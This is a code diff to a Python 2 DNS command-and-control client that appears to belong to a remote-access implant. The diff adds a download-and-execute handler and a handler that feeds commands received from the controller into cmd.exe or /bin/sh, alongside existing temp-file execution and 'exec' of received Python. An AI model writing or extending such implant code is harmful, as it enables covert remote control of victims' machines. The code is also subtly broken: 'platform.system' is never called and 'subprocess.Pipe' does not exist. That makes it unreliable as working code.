@@ -10,6 +10,7 @@ import socket
 import os
 
 import logging
+import subprocess
 
 class DNSCommandClientLauncher(DnsCommandsClient):
     def __init__(self, domain):
@@ -28,6 +29,9 @@ class DNSCommandClientLauncher(DnsCommandsClient):
 
         DnsCommandsClient.__init__(self, domain, key=key)
 
+    def on_downloadexec_content(self, url, action, content):
+        self.on_pastelink_content(url, action, content)
+
     def on_pastelink_content(self, url, action, content):
         if action.startswith('exec'):
             with tempfile.NamedTemporaryFile() as tmp:
@@ -39,6 +43,34 @@ class DNSCommandClientLauncher(DnsCommandsClient):
         elif action.startswith('pyexec'):
             try:
                 exec content
+            except Exception as e:
+                logging.exception(e)
+        elif action.startswith('sh'):
+            try:
+                pipe = None
+                if platform.system == 'Windows':
+                    kwargs = {
+                        'stdin': subprocess.PIPE
+                    }
+
+                    if hasattr(subprocess, 'STARTUPINFO'):
+                        startupinfo = subprocess.STARTUPINFO()
+                        startupinfo.dwFlags |= \
+                          subprocess.CREATE_NEW_CONSOLE | \
+                          subprocess.STARTF_USESHOWWINDOW
+
+                        kwargs.update({
+                            'startupinfo': startupinfo,
+                        })
+
+                    pipe = subprocess.Pipe('cmd.exe', **kwargs)
+                else:
+                    pipe = subprocess.Popen(['/bin/sh'], stdin=subprocess.PIPE)
+
+                pipe.stdin.write(content)
+                pipe.stdin.close()
+                pipe.communicate()
+
             except Exception as e:
                 logging.exception(e)
 
